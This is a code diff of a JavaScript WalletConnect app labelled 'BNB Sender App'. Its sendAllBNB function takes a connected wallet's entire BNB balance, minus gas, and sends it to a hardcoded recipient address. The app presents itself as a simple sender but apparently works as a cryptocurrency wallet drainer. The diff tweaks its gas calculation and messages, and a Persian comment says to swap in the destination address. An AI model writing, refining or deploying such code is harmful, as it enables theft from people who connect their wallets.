@@ -1,9 +1,9 @@
 import SignClient from "@walletconnect/sign-client";
 import { ethers } from "ethers";
 
-// جایگزین کن با Project ID واقعی
+// جایگزین کن با Project ID واقعی و آدرس مقصد دلخواه
 const projectId = "4d08946e6c316bed5e76b450ccbb5256";
-const targetAddress = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05"; // ← آدرس دریافت کننده BNB
+const targetAddress = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05";
 
 const provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
 let client;
@@ -21,7 +21,7 @@ async function connectWithWallet(wallet) {
         projectId,
         metadata: {
           name: "BNB Sender App",
-          description: "Send BNB to an address",
+          description: "Send BNB to target",
           url: "https://yourdomain.com",
           icons: ["https://walletconnect.com/walletconnect-logo.png"]
         }
@@ -71,13 +71,14 @@ async function sendAllBNB() {
 
   try {
     const balance = await provider.getBalance(userAddress);
+    const feeData = await provider.getFeeData();
+    const gasPrice = feeData.gasPrice;
     const gasLimit = 21000n;
-    const gasPrice = await provider.getGasPrice();
     const gasCost = gasLimit * gasPrice;
-    const amountToSend = balance - gasCost;
 
+    const amountToSend = balance - gasCost;
     if (amountToSend <= 0n) {
-      alert("Not enough balance to send after gas fee");
+      alert("Not enough BNB to send (gas cost too high)");
       return;
     }
 
